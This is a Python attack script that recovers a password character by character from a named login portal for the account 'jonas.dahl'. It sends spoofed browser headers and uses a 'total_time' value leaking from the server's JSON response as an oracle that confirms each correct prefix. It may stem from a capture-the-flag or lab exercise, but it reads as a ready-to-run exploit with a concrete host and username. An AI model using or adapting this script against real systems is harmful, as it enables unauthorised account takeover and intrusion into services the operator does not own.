import requests
import json
import string

# Target URL
url = "https://portal.regjeringen.uiaikt.no/login"

# HTTP headers
headers = {
    "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Origin": "https://portal.regjeringen.uiaikt.no",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://portal.regjeringen.uiaikt.no/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

# Function to send a request and get the total_time and result from the response
def get_login_response(username, password):
    response = requests.post(url, headers=headers, json={"username": username, "password": password})
    try:
        response_data = json.loads(response.text)
    except json.JSONDecodeError:
        print("Failed to decode JSON from response")
        return {}, 0, ""  # Return empty dict, 0, and empty string
    return response_data, response_data.get("total_time", 0), response_data.get("result", "")

# Function to find the correct character for each position
def find_correct_password(username):
    norwegian_chars = 'åøæÅØÆ'
    characters = [chr(i) for i in range(32, 127)] + list(norwegian_chars) # All printable ASCII characters
    password_length = 12  # Set the length of the password to 12 characters
    password = [''] * password_length  # Initialize password array for a 12-character password

    for pos in range(password_length):
        for char in characters:
            test_password = ''.join(password[:pos]) + char
            print(f"Trying {test_password} for username {username}")  # Print the password being tried
            response_data, total_time, result = get_login_response(username, test_password)
            print(f"Server response: {response_data}")
            # Check if the login was successful
            if result != "incorrect":
                print(f"Successful login detected with password: {test_password}")
                return test_password

            if total_time == pos + 1:  # Correct character found if total_time increases
                password[pos] = char
                print(f"Found character at position {pos}: {char}")
                break

    return ''.join(password)

# Example usage
username = "jonas.dahl"
correct_password = find_correct_password(username)
print(f"Correct password found for {username}: {correct_password}")
